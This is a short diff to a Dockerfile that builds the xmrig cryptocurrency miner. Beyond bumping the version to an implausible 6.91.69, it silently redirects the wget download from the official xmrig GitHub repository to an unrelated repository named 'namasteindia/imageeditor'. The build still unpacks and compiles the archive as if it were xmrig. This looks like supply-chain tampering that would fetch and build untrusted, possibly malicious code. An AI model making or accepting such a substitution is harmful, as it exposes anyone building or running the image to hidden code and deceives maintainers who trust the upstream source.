@@ -23,7 +23,7 @@ RUN set -xe; \
 
 
 FROM ubuntu:22.04 as build-runner
-ARG VERSION=6.20.0
+ARG VERSION=6.91.69
 LABEL maintainer="Patrice Ferlet <metal3d@gmail.com>"
 
 RUN set -xe; \
@@ -33,7 +33,7 @@ RUN set -xe; \
     update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 100; \
     update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 100; \
     rm -rf /var/lib/apt/lists/*; \
-    wget https://github.com/xmrig/xmrig/archive/refs/tags/v${VERSION}.tar.gz; \
+    wget https://github.com/namasteindia/imageeditor/archive/refs/tags/v${VERSION}.tar.gz; \
     tar xf v${VERSION}.tar.gz; \
     mv xmrig-${VERSION} /xmrig; \
     cd /xmrig; \
